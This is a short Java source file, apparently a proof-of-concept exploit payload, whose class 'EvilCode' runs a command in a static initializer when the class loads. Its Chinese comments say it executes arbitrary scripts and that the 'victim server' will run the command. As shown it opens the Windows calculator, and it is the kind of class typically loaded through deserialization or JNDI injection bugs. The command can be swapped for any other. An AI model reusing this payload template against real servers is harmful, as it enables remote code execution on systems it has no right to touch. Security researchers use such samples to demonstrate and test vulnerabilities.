package bug;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

/**
 * 执行任意的脚本，目前的脚本会使windows服务器打开计算器.
 */
public class EvilCode {
  static {
    System.out.println("受害服务器将执行下面命令行");
    Process p;

    String[] cmd = {"calc"};
    try {
      p = Runtime.getRuntime().exec(cmd);
      InputStream fis = p.getInputStream();
      InputStreamReader isr = new InputStreamReader(fis);
      BufferedReader br = new BufferedReader(isr);
      String line = null;
      while ((line = br.readLine()) != null) {
        System.out.println(line);
      }
    } catch (IOException e) {
      e.printStackTrace();
    }
  }
}